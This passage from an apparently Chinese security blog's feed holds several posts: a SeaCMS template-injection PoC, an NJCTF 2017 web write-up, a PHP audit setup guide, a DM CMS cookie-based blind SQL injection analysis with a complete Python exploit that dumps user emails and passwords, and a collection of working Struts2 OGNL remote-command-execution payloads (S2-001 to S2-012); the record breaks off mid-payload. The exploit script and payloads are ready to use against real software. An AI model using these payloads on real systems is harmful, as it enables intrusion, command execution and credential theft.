class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>那么接下来就可以构造poc了，类似sql注入，我们先把前面的if标签语句闭合，写入恶意代码并闭合后面的if标签。<br>example：<code>}{end if}{if:1)phpinfo();if(1}{end if}</code><br>本地验证一下<br><img src="http://blog.0kami.cn/img/seacms/1.png" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是一个比较经典的漏洞，也可以被称为模版解析吧我觉得：）<br>ps: 后悔啊，没有先提交个poc平台T_T</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJCTF2017 writeup</title>
      <link href="2017/03/15/old-old-njctf-2017/"/>
      <url>2017/03/15/old-old-njctf-2017/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>辞职后没事情干，刚好赶上njctf，还是一样菜啊，只做了7道题，还要继续努力💪（ps:毕业设计什么鬼啊）写一下web的writeup，由于题目还开着，把没做出来的做一遍，纪录一下我觉得有必要记的题<br><a id="more"></a></p><h1 id="Web题"><a href="#Web题" class="headerlink" title="Web题"></a>Web题</h1><h3 id="Login（100）"><a href="#Login（100）" class="headerlink" title="Login（100）"></a>Login（100）</h3><p>好吧，这道题取了巧，谁让大黑客们都是弱密码呢！！！！<br>由于没有做验证码机制，所以扫了一波弱口令，然后…然后就进去啦<br>其实这道题考的是mysql的长度限制漏洞。利用2个mysql的特性</p><ol><li>当数据超过建表时的规定的数据大小，mysql将超过的部分截断</li><li>当select时where查询字句中的数据如果最后以空格结尾，mysql默认将空格去除查询<br>那么利用这2个特性，我们只要注册一个admin+N*%20+x就可以已admin登陆，然后getflag：NJCTF{4R3_Y0u_7H3_Re41_aDM1N?}</li></ol><h3 id="Get-Flag-100"><a href="#Get-Flag-100" class="headerlink" title="Get Flag(100)"></a>Get Flag(100)</h3><p>这道题考了命令执行漏洞<br>首先发现存在文件任意读取漏洞，那么尝试读取一下源码，最后试出来是app.py<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/1.png" alt><br>可以看到有个命令执行并且是可控的，但是过滤了一些字符，用&amp;就可以绕过。<br>ls 查看一下<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/2.png" alt><br>可以看到flag文件<br><code>9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag</code><br>cat一波，这里的特殊字符转移是关键<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/3.png" alt></p><h3 id="come-on-200"><a href="#come-on-200" class="headerlink" title="come on(200)"></a>come on(200)</h3><p>具体看大佬们的writeup即可，这道题主要学到了其盲注的注入方式。<br>binary函数用来区分大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select xxx from xxx like x%</span><br><span class="line">select xxx from xxx like xx%</span><br><span class="line">select xxx from xxx like xxx%</span><br><span class="line">select xxx from xxx like xxxx%</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过like来住出数据</p><h3 id="Be-Admin-300"><a href="#Be-Admin-300" class="headerlink" title="Be Admin(300)"></a>Be Admin(300)</h3><p>首先发现有.bak文件，下下来看一下,发现这道题主要考的是cbc字节翻转攻击和padding oracle attack.<br>首先由于登陆出存在注入，我们可以把数据中的encrypt_pass取出来<br>登陆绕过可以通过php弱类型比较来绕过，admin／0即可登陆<br>要通过cbc字节翻转必须知道defaultId的值，所以我们需要先跑出defaultId的值<br>padding oracle attack参考<a href="http://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">padding oracle attack</a><br>符合我们现在的情况：</p><ol><li>已知真实IV</li><li>已知对应cipher text</li><li>当解密失败ERROR错误<br>题目环境可能坏了，本地搭一下，跑一下中间值<br>需要注意的一点是padding oracle attack第一个字符没办法跑出来，由于最后一个字符解出来是空白所以还是error，不过没关系暴力一遍就好了（ps：有了原理，写代码很容易，就不放代码了）</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>欠缺的还是很多，继续💪</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> njctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php代码审计前的准备</title>
      <link href="2017/02/03/old-old-code-review-pre-prepare/"/>
      <url>2017/02/03/old-old-code-review-pre-prepare/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>所谓“工欲善其事,必先利其器”，在代码审计前，我们需要准备提高我们审计效率的工具。</p><a id="more"></a><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>Mac</li><li>xampp(可以用phpstudy或者是其他集成环境代替)</li><li>Navicat Premium(个人认为Mac下最好的数据库管理工具，学生党只能用**,有能力尽量支持正版)</li><li>phpstorm(这里的IDE用的是我自己比较习惯的，也可以使用其他你比较熟悉的)</li><li>xdebug(用来动态调试)</li><li>终端</li><li>浏览器(firefox、chrome,这里使用firefox,hackbar是个好东西)</li></ol><p>安装上述的软件之类的就不说了，下文主要是动态调试环境搭建。</p><h1 id="动态调试环境"><a href="#动态调试环境" class="headerlink" title="动态调试环境"></a>动态调试环境</h1><h2 id="php添加xdebug配置"><a href="#php添加xdebug配置" class="headerlink" title="php添加xdebug配置"></a>php添加xdebug配置</h2><p>xampp的php.ini位于<code>/install/path/etc/php.ini</code>，在配置文件最后添加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so</span><br><span class="line">xdebug.remote_autostart=on</span><br><span class="line">xdebug.remote_enable=on</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.remote_mode=&quot;req&quot;</span><br><span class="line">xdebug.remote_log=&quot;/var/log/xdebug.log&quot;</span><br><span class="line">xdebug.remote_host=localhost/127.0.0.1</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line">xdebug.idekey=&quot;PhpStorm&quot;</span><br></pre></td></tr></table></figure><p>so文件是xampp自带的，mac下的配置可以直接copy我的<br>保存后重启apache</p><h2 id="firefox安装xdebug扩展"><a href="#firefox安装xdebug扩展" class="headerlink" title="firefox安装xdebug扩展"></a>firefox安装xdebug扩展</h2><p>firefox下的xdebug扩展叫 the easiest xdebug，搜索一下安装<br>安装完成后点亮工具栏上的甲虫，开启调试<br><img src="../../../../img/pre_code_review/bug.png" alt><br>设置key,更php配置文件中相同<br><img src="../../../../img/pre_code_review/bug2.png" alt></p><h2 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="配置phpstorm"></a>配置phpstorm</h2><p>打开Preferences-&gt;Languages&amp;Framework-&gt;php<br><img src="../../../../img/pre_code_review/step1.png" alt><br>如图设置servers，接着设置debug下的DBGp Proxy<br><img src="../../../../img/pre_code_review/step2.png" alt><br>设置完成后在工具栏处找到edit Configurations<br><img src="../../../../img/pre_code_review/step3.png" alt><br>新增php web application<br><img src="../../../../img/pre_code_review/step4.png" alt><br>接下来就可以愉快的下断点，动态调试了</p><h1 id="mysql执行审计监控"><a href="#mysql执行审计监控" class="headerlink" title="mysql执行审计监控"></a>mysql执行审计监控</h1><p>在navicat或终端中运行以下2句</p><blockquote><p>set global general_log=on;<br>set global log_output=’table’;</p></blockquote><p>查看mysql.general_log表可以看到运行过的sql语句，方便我们查询<br>win下可以用seay的代码审计工具，带了mysql的sql监控</p><h1 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h1><p>终端主要用到了grep这个工具，网上有很多相关的教材。<br>主要匹配输入输出点，危险函数等等<br>具体的以后有空了再补充</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>记录一下过程，以后能看看，愉快的代码审计吧:P</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DM企业建站系统前台盲注</title>
      <link href="2017/01/29/old-old-DM-sql-injection/"/>
      <url>2017/01/29/old-old-DM-sql-injection/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>今天搞了一下动态调试的东西，然后顺便看了看上次下的<a href="http://www.demososo.com/down.html" target="_blank" rel="noopener">DM企业建站系统2017.01.23</a>。</p><a id="more"></a><h1 id="前台cookie-时间盲注"><a href="#前台cookie-时间盲注" class="headerlink" title="前台cookie 时间盲注"></a>前台cookie 时间盲注</h1><p>大致跟了一下几个入口文件，该套cms主要的安全措施为<code>htmlentities</code>，在POST&amp;&amp;GET的输入点做了html实体化的操作，但是这并不转义单引号（默认不转义单引号具体可看<a href="http://www.php.net/manual/en/function.htmlentities.php" target="_blank" rel="noopener">htmlentities</a>），看了一下进行数据库查询的sql语句，涉及到字符串类型时，都是单引号闭合，那么很清楚，在进行数据库查询时容易产生sql注入漏洞。<br>那么接下来主要找一下进行数据库操作的位置。</p><ol><li>POST&amp;&amp;GET</li><li>COOKIE </li></ol><p>ps：这里就随便找了一个地方，因为这套系统注入不要太多，连后台登陆都可以 :P</p><p>前面提到对POST&amp;&amp;GET做了实体转义，但是grep找了一下cookie，发现并没有对cookie的值进行安全操作，直接带入数据库查询。<br>indexDM_load.php Line 108</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) </span><br><span class="line">    $curstyle = $_COOKIE[&quot;curstyle&quot;];</span><br><span class="line">else </span><br><span class="line">    $curstyle = $row[&apos;curstyle&apos;];</span><br><span class="line">    </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; </span><br><span class="line"> //echo $sqlstyle;exit;</span><br><span class="line">if(getnum($sqlstyle)&gt;0)&#123;</span><br><span class="line">$rowstyle = getrow($sqlstyle);</span><br></pre></td></tr></table></figure><p>上述为漏洞的主要成因点，如果cookie中存在curstyle,优先选用cookie中的值，然后带入数据库查询。由于没有找到具体回显数据的地方，所以采用时间盲注的方式获取数据。</p><p>带上自己写的EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Created by wh1t3P1g at 2017/1/30</span><br><span class="line"></span><br><span class="line">import requests,time</span><br><span class="line"></span><br><span class="line">class CookieBlindSqlInjection:</span><br><span class="line"></span><br><span class="line">    def __init__(self,url):</span><br><span class="line">        self.url=url</span><br><span class="line">        self.len=0</span><br><span class="line"></span><br><span class="line">    def getLength(self,column,table):</span><br><span class="line">        payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot;</span><br><span class="line">        payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot;</span><br><span class="line">        #first confirm bin-format data length</span><br><span class="line">        len=0</span><br><span class="line">        for i in range(1,9):</span><br><span class="line">            cookie=payload0.format(column=column,table=table,line_start=0,flag=i)</span><br><span class="line">            flag=self.send(cookie)</span><br><span class="line">            if flag==&quot;0&quot;:</span><br><span class="line">                len=i</span><br><span class="line">                break</span><br><span class="line">        res=&quot;&quot;</span><br><span class="line">        for i in range(1,len+1):</span><br><span class="line">            cookie=payload1.format(column=column,col_start=i,table=table,line_start=0)</span><br><span class="line">            flag=self.send(cookie)</span><br><span class="line">            res+=flag</span><br><span class="line">            # print res</span><br><span class="line">        self.len=int(res,2)</span><br><span class="line">        pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len))</span><br><span class="line">        return int(res,2)</span><br><span class="line"></span><br><span class="line">    def getData(self,column,table):</span><br><span class="line">        payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot;</span><br><span class="line">        payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot;</span><br><span class="line">        total_res=&quot;&quot;</span><br><span class="line">        for i in range(1,self.len+1):#具体数据的长度</span><br><span class="line">            len = 0</span><br><span class="line">            for j in range(1, 9):</span><br><span class="line">                cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j)</span><br><span class="line">                flag = self.send(cookie)</span><br><span class="line">                if flag == &quot;0&quot;:</span><br><span class="line">                    len = j</span><br><span class="line">                    break</span><br><span class="line">            # print &quot;len:&quot;+str(len)</span><br><span class="line">            res = &quot;&quot;</span><br><span class="line">            for k in range(1, len + 1):</span><br><span class="line">                cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0)</span><br><span class="line">                flag = self.send(cookie)</span><br><span class="line">                res += flag</span><br><span class="line">                # print res</span><br><span class="line">            total_res+=chr(int(res,2))</span><br><span class="line">            pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res)</span><br><span class="line">        return total_res</span><br><span class="line"></span><br><span class="line">    def send(self,cookie):</span><br><span class="line">        headers=&#123;&quot;Cookie&quot;:cookie&#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(self.url, headers=headers,timeout=4)</span><br><span class="line">            return &quot;1&quot;</span><br><span class="line">        except:</span><br><span class="line">            return &quot;0&quot;</span><br><span class="line"></span><br><span class="line">def pprint(flag,content):</span><br><span class="line">    print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \</span><br><span class="line">        .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;)</span><br><span class="line">    pprint(&quot;*&quot;,&quot;program start&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;)</span><br><span class="line">    cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;)</span><br><span class="line">    email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;)</span><br><span class="line">    cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;)</span><br><span class="line">    ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;program done&quot;)</span><br></pre></td></tr></table></figure><p>ps:DM这个鬼，代码写的好乱啊T_T</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2命令执行各版本记录</title>
      <link href="2017/01/13/old-old-Struts2-history-payload/"/>
      <url>2017/01/13/old-old-Struts2-history-payload/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏</p><a id="more"></a><ul><li><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</a></li><li><a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/4606891.html</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-xxx" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-xxx</a></li><li><a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-009" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-009</a></li></ul><h1 id="Struts2命令执行集合"><a href="#Struts2命令执行集合" class="headerlink" title="Struts2命令执行集合"></a>Struts2命令执行集合</h1><p>下文不是具体的分析文，能力有限，仅记录一下以做将来复习查用。<br>过段时间会将所有的漏洞环境上传到github上，环境来源大部分为我偶像<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>博客上共享的以及官网上下的对应版本的示例环境。<br>update:2017/1/16 <a href="https://github.com/0kami/Struts2Environment/" target="_blank" rel="noopener">环境地址</a></p><h2 id="Struts2-S2-001"><a href="#Struts2-S2-001" class="headerlink" title="Struts2 S2-001"></a>Struts2 S2-001</h2><pre><code>影响版本：2.0.0 - 2.0.8具体详情：https://struts.apache.org/docs/s2-001.html</code></pre><blockquote><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p></blockquote><p>上文引用<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>的描述。</p><h3 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取tomcat执行路径"><a href="#获取tomcat执行路径" class="headerlink" title="获取tomcat执行路径"></a>获取tomcat执行路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="获取web根目录"><a href="#获取web根目录" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-005"><a href="#Struts2-S2-005" class="headerlink" title="Struts2 S2-005"></a>Struts2 S2-005</h2><pre><code>影响版本: 2.0.0 - 2.1.8.1漏洞详情: http://struts.apache.org/docs/s2-005.html</code></pre><blockquote><p>struts2漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为ongl语句执行(可理解为java代码)。ongl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式讲这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p></blockquote><p>上文引用<a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">LittleHann</a>的描述</p><h3 id="构造PoC-1"><a href="#构造PoC-1" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-1"><a href="#获取web根目录-1" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43req\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\43xman\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))&apos;)(d))&amp;(i99)((&apos;\43xman.getWriter().close()&apos;)(d))</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-1"><a href="#执行系统命令-1" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;&quot;+cmd+&quot;\&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d))</span><br></pre></td></tr></table></figure><p>上面2个PoC摘自k8team，为了写PoC，有所改动，但是这里就不贴上来了：）</p><h2 id="Struts2-S2-009"><a href="#Struts2-S2-009" class="headerlink" title="Struts2 S2-009"></a>Struts2 S2-009</h2><pre><code>影响版本: 2.0.0 - 2.3.1.1漏洞详情: https://struts.apache.org/docs/s2-009.html</code></pre><p>漏洞利用点跟S2-003和S2-005类似，利用OGNL表达式(1)(2),会执行1的OGNL表达式，009构造了的方法为test=(some OGNL 表达式)(1)&amp;z[(test)(1)]=true。<br>z[(test)(1)]=true,对struts2来说是合法的参数，但是(test)(1)会执行上述说的方法，test的值被带入计算，造成命令执行。</p><h3 id="构造PoC-2"><a href="#构造PoC-2" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="弹计算器"><a href="#弹计算器" class="headerlink" title="弹计算器"></a>弹计算器</h4><p>ps:实验环境试了好几次都不能执行系统命令，路过的大佬求指教：）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true</span><br></pre></td></tr></table></figure><p>用的是<code>person/new-person.action</code>这个控制器</p><h4 id="获取web根目录-2"><a href="#获取web根目录-2" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-012"><a href="#Struts2-S2-012" class="headerlink" title="Struts2 S2-012"></a>Struts2 S2-012</h2><pre><code>影响版本: 2.0.0 - 2.3.13漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-012</code></pre><p>Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量,struts在获取其值时会执行OGNL表达式，从而造成命令执行</p><h3 id="构造PoC-3"><a href="#构造PoC-3" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根路径"><a href="#获取web根路径" class="headerlink" title="获取web根路径"></a>获取web根路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-2"><a href="#执行系统命令-2" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 